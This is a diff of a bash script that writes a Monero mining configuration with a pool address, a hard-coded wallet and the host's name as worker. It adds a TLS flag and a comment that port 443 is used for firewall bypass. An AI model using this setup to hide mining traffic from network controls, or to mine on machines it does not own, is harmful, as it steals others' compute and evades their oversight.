@@ -1,11 +1,12 @@
 #!/bin/bash
 
 
-POOL="pool.supportxmr.com:443"
+POOL="pool.supportxmr.com:443"  # Using 443 for firewall bypass with TLS
 WALLET="85aEKMnziJmeGHYzaWt4cxb2qopFxy7sHj7x3drB251jKG4QFCr5jzveLrzstQ2xHPeoXwvU6gmd23Vc3i8qj59e2h9hLHA"
 WORKER=$(hostname)
 THREADS=0  # 0 = auto-detect
 DONATION_LEVEL=1
+USE_TLS=true  # Enable TLS for port 443
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -84,7 +85,7 @@ cat > config.json << EOF
             "pass": "$WORKER",
             "keepalive": true,
             "nicehash": false,
-            "tls": true
+            "tls": $USE_TLS
         }
     ],
     "donate-level": $DONATION_LEVEL,
